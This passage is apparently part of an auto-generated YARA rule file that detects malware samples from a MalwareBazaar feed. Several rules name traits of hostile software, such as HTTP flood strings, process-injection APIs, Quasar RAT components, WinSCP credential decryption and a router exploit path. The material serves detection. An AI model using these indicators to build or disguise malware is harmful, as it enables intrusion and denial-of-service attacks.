        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Windows_ea895be4bc7006fdb8e25a849c0aa26000c12b25d7a0342890a110ef79f9662f
{
    meta:
        description = "Auto ML: ea895be4bc7006fdb8e25a849c0aa26000c12b25d7a0342890a110ef79f9662f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "system"
        $s7 = "no such process"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "not a socket"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8082KB and
        all of them
}

rule Windows_eaa7090b669f319c0668f25a2ae7d78aa1d23503ad6289d0b699acd1ed635944
{
    meta:
        description = "Auto ML: eaa7090b669f319c0668f25a2ae7d78aa1d23503ad6289d0b699acd1ed635944"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "SetUnhandledExceptionFilter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB and
        all of them
}

rule Windows_eab4a2382263fbfedbddaed6cd19627ba3d5d9f5db8060a2a1adc2b1c4ca7125
{
    meta:
        description = "Auto ML: eab4a2382263fbfedbddaed6cd19627ba3d5d9f5db8060a2a1adc2b1c4ca7125"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB and
        all of them
}

rule Windows_eb249d8b90aa5fa4627166c0a495f1cdb2a66bf59469a5fb7790a7aad13673fd
{
    meta:
        description = "Auto ML: eb249d8b90aa5fa4627166c0a495f1cdb2a66bf59469a5fb7790a7aad13673fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_eb5b21fb9d2151803fe67c0624c3c3c4c12c44392db1d4c668d33fc9b84f6900
{
    meta:
        description = "Auto ML: eb5b21fb9d2151803fe67c0624c3c3c4c12c44392db1d4c668d33fc9b84f6900"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Remote.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{FDA9783F-DF6E-4286-9CB0-B236AF8FCFF9}"
        $s15 = "<Module>{590bc86f-3da3-489b-b4a0-dc228ff9f551}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 503KB and
        all of them
}

rule Windows_eb916eb723273fae9324b464bfb6f405d77a2b1b48a0a498de5676d54a0a38a8
{
    meta:
        description = "Auto ML: eb916eb723273fae9324b464bfb6f405d77a2b1b48a0a498de5676d54a0a38a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Linux_eb959c0408d63d9afa27d2ebd9c599798c1354db594be1718bb9710afb949f7b
{
    meta:
        description = "Auto ML: eb959c0408d63d9afa27d2ebd9c599798c1354db594be1718bb9710afb949f7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_166cbf3c1dbadae88b99b409f7c08afa849b5426c17e0fcff28bc6c7d31b379d
{
    meta:
        description = "Auto ML: 166cbf3c1dbadae88b99b409f7c08afa849b5426c17e0fcff28bc6c7d31b379d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "MSVCRT.dll"
        $s4 = "_acmdln"
        $s5 = "__getmainargs"
        $s6 = "__setusermatherr"
        $s7 = "__set_app_type"
        $s8 = "GetProcAddress"
        $s9 = "LoadLibraryA"
        $s10 = "OpenProcess"
        $s11 = "CloseHandle"
        $s12 = "GetCurrentProcess"
        $s13 = "Process32Next"
        $s14 = "Process32First"
        $s15 = "CreateToolhelp32Snapshot"
        $s16 = "GetVersion"
        $s17 = "WinExec"
        $s18 = "LoadResource"
        $s19 = "DeleteFileA"
        $s20 = "WriteProcessMemory"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB and
        all of them
}

rule Linux_eb9b5052a1447534caef413105d71c62b888421bddd12fb56d31a371934bc0e9
{
    meta:
        description = "Auto ML: eb9b5052a1447534caef413105d71c62b888421bddd12fb56d31a371934bc0e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Android_eba381ace2936c6cdf4c17b7f1847f394c677ed967abcd3f6503bc35e54122e1
{
    meta:
        description = "Auto ML: eba381ace2936c6cdf4c17b7f1847f394c677ed967abcd3f6503bc35e54122e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/dexopt/baseline.profpro"
        $s2 = "assets/dexopt/baseline.profm"
        $s3 = "sEtt0"
        $s4 = "Setu>"
        $s5 = "gCmd"
        $s6 = "wiNw"
        $s7 = "sEtC"
        $s8 = "aZGEt]G"
        $s9 = "]DWIN"
        $s10 = "gEtY"
        $s11 = "YZ\"sETl"
        $s12 = "moqWIN"
        $s13 = "QsEt"
        $s14 = "AwIn"
        $s15 = "OgeT"
        $s16 = "FWIN"
        $s17 = "CMDm"
        $s18 = "assets/compressed/arm64-v8a/libs.spo"
        $s19 = "ssETU"
        $s20 = "sEtgm"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 85780KB and
        all of them
}

rule Windows_ebb6ee582848de55de5d4088a59636a6f38d62c87ecdb96a8963046d85252507
{
    meta:
        description = "Auto ML: ebb6ee582848de55de5d4088a59636a6f38d62c87ecdb96a8963046d85252507"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB and
        all of them
}

rule Linux_ebda5250a8c9fbc3d0a84aed0067c084698246be607bb8aa57c0fd751f14d8c0
{
    meta:
        description = "Auto ML: ebda5250a8c9fbc3d0a84aed0067c084698246be607bb8aa57c0fd751f14d8c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB and
        all of them
}

rule Windows_ebf36abacdc2c0a0960f10db12171e48a0fd1a962f2497223fa411d645a78469
{
    meta:
        description = "Auto ML: ebf36abacdc2c0a0960f10db12171e48a0fd1a962f2497223fa411d645a78469"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".data"
        $s2 = "QWIN>"
        $s3 = "kernel32.dll"
        $s4 = "user32.dll"
        $s5 = "advapi32.dll"
        $s6 = "oleaut32.dll"
        $s7 = "shell32.dll"
        $s8 = "version.dll"
        $s9 = "GetModuleHandleA"
        $s10 = "GetProcAddress"
        $s11 = "ExitProcess"
        $s12 = "LoadLibraryA"
        $s13 = "RegCloseKey"
        $s14 = "CreateFontA"
        $s15 = "ShellExecuteA"
        $s16 = "GetFileVersionInfoA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1351KB and
        all of them
}

rule Linux_ec290f43906d38164409c75f65b4bd1515a3a20da00f29ae7028d1f9561fb7fa
{
    meta:
        description = "Auto ML: ec290f43906d38164409c75f65b4bd1515a3a20da00f29ae7028d1f9561fb7fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GETv"
        $s2 = "HTTP/1.1"
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_ec49ea3da7d627ad17042d48b66b1c8fbfd840e3e2b5920ea0509a735d9175d2
{
    meta:
        description = "Auto ML: ec49ea3da7d627ad17042d48b66b1c8fbfd840e3e2b5920ea0509a735d9175d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB and
        all of them
}

rule Windows_ec934a185eaa6cbb76232ab9643e1f579da5515717fe2f78c4de2e3ab8e27707
{
    meta:
        description = "Auto ML: ec934a185eaa6cbb76232ab9643e1f579da5515717fe2f78c4de2e3ab8e27707"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "[\\XWIN"
        $s3 = "GcMD<~"
        $s4 = "kernel32.dll"
        $s5 = "comctl32.dll"
        $s6 = "jWiN"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 7113KB and
        all of them
}

rule Windows_ecbaeab79bb9ff98c691ffddfd29e59282af48d48a87fbe20cb94dc83c1c89f3
{
    meta:
        description = "Auto ML: ecbaeab79bb9ff98c691ffddfd29e59282af48d48a87fbe20cb94dc83c1c89f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_eccfd9f2d1d935f03d9fbdb4605281c7a8c23b3791dc33ae8d3c75e0b8fbaec6
{
    meta:
        description = "Auto ML: eccfd9f2d1d935f03d9fbdb4605281c7a8c23b3791dc33ae8d3c75e0b8fbaec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "system"
        $s7 = "FlsSetValue"
        $s8 = "FlsGetValue"
        $s9 = "CorExitProcess"
        $s10 = "Filename too long"
        $s11 = "Read-only file system"
        $s12 = "File too large"
        $s13 = "Too many open files"
        $s14 = "Too many open files in system"
        $s15 = "File exists"
        $s16 = "Resource temporarily unavailable"
        $s17 = "No child processes"
        $s18 = "Bad file descriptor"
        $s19 = "No such process"
        $s20 = "No such file or directory"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 381KB and
        all of them
}

rule Windows_168264e04849c4a91f916419a9485f9831040d6926fe1faa27b342dcc1e039e9
{
    meta:
        description = "Auto ML: 168264e04849c4a91f916419a9485f9831040d6926fe1faa27b342dcc1e039e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Linux_ecee74b397919c63c4a1427587ce9ab9c3bb62a280330a3ddcdb873d1f813c6a
{
    meta:
        description = "Auto ML: ecee74b397919c63c4a1427587ce9ab9c3bb62a280330a3ddcdb873d1f813c6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB and
        all of them
}

rule Linux_ecfb33cfd3a8fb92e1097c93143e816701a4aaf44ff817acd0c7e1f6bcdb4481
{
    meta:
        description = "Auto ML: ecfb33cfd3a8fb92e1097c93143e816701a4aaf44ff817acd0c7e1f6bcdb4481"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Windows_ecfe89307878026257826ff9a3f994d0219099355bc019de45b85cda770d925d
{
    meta:
        description = "Auto ML: ecfe89307878026257826ff9a3f994d0219099355bc019de45b85cda770d925d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 213KB and
        all of them
}

rule Windows_ed347277bed3d64edf62b11c0c3b15e559a36807c13f6d0036afeb8554b1f506
{
    meta:
        description = "Auto ML: ed347277bed3d64edf62b11c0c3b15e559a36807c13f6d0036afeb8554b1f506"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "fantasy_genre_with_reality_effects.exe"
        $s16 = "<Module>"
        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5515KB and
        all of them
}

rule Windows_ed521f9314ec81688174f7c3b29e128339bf7586e930b1dca76a8e165b9cb5b5
{
    meta:
        description = "Auto ML: ed521f9314ec81688174f7c3b29e128339bf7586e930b1dca76a8e165b9cb5b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB and
        all of them
}

rule Windows_ed7ac88af0b59c8cacfbd17cfa2c85d6648026f95c82efa70e9cb98134f007b1
{
    meta:
        description = "Auto ML: ed7ac88af0b59c8cacfbd17cfa2c85d6648026f95c82efa70e9cb98134f007b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.reloc"
        $s2 = "@.rsrc"
        $s3 = "LoadLibraryW"
        $s4 = "SetThreadAffinityMask"
        $s5 = "GetCurrentProcess"
        $s6 = "SystemTimeToFileTime"
        $s7 = "WriteFile"
        $s8 = "TerminateProcess"
        $s9 = "CloseHandle"
        $s10 = "SetClipboardData"
        $s11 = "GetTickCount"
        $s12 = "GetCPInfo"
        $s13 = "GetModuleHandleW"
        $s14 = "SHELL32.dll"
        $s15 = "Thread32Next"
        $s16 = "TlsSetValue"
        $s17 = "SetFilePointer"
        $s18 = "GetSystemInfo"
        $s19 = "DeleteCriticalSection"
        $s20 = "GetStringTypeA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4936KB and
        all of them
}

rule Windows_ed926217f9c0ac06a4349c5a3e2b0bbd8e8d162fc20cb6083a7f86457690af6b
{
    meta:
        description = "Auto ML: ed926217f9c0ac06a4349c5a3e2b0bbd8e8d162fc20cb6083a7f86457690af6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "GETMANV"
        $s6 = "System.Data"
        $s7 = "System.Collections.Generic"
        $s8 = "add_Load"
        $s9 = "Hopdong_Load"
        $s10 = "DanhSachLuong_Load"
        $s11 = "Vitri_Load"
        $s12 = "PhongBan_Load"
        $s13 = "ThongTinTaiKhoan_Load"
        $s14 = "FormThemNhanVien_Load"
        $s15 = "FormThongTinNhanVienNhanVien_Load"
        $s16 = "ThongTinNhanVien_Load"
        $s17 = "ChucVu_Load"
        $s18 = "get_DarkRed"
        $s19 = "get_Checked"
        $s20 = "set_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 928KB and
        all of them
}

rule Linux_edc1a7fda1d6a02bbcc94a09be6b886b90d6c2aca1e5830c1a4bb841e0466bf4
{
    meta:
        description = "Auto ML: edc1a7fda1d6a02bbcc94a09be6b886b90d6c2aca1e5830c1a4bb841e0466bf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Windows_ede06cac185471f1c554ae147570c8dc6fafa9b580dcf4dfcfe5db3d0b6b6422
{
    meta:
        description = "Auto ML: ede06cac185471f1c554ae147570c8dc6fafa9b580dcf4dfcfe5db3d0b6b6422"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "too many files"
        $s6 = "invalid filename"
        $s7 = "file too large"
